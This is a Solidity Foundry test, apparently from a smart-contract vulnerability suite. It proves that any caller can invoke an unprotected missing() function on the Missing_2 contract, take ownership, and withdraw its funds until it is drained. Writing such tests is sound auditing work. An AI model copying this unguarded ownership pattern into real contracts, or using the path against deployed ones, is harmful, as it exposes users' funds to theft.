
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {
    Missing_2 private target;

    function setUp() public {
        target = new Missing_2();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Note: We do NOT exclude any privileged roles because the vulnerability is that
        // the missing() function has no access control - anyone can call it and become owner.

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the full attack path (optional but demonstrates impact)
        vm.deal(address(target), 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call the unprotected missing() function
        // This should succeed for ANY caller, allowing them to become the owner
        target.missing();

        // ASSERT SUCCESS: Verify the caller is now the owner by checking they can withdraw
        // If the caller successfully became owner, they can call withdraw()
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        target.withdraw();
        
        // Verify funds were transferred to the caller (proving they are now the owner)
        assertEq(caller.balance, callerBalanceBefore + 1 ether, "Caller should have received contract funds");
        assertEq(address(target).balance, 0, "Contract should be drained");
    }
}
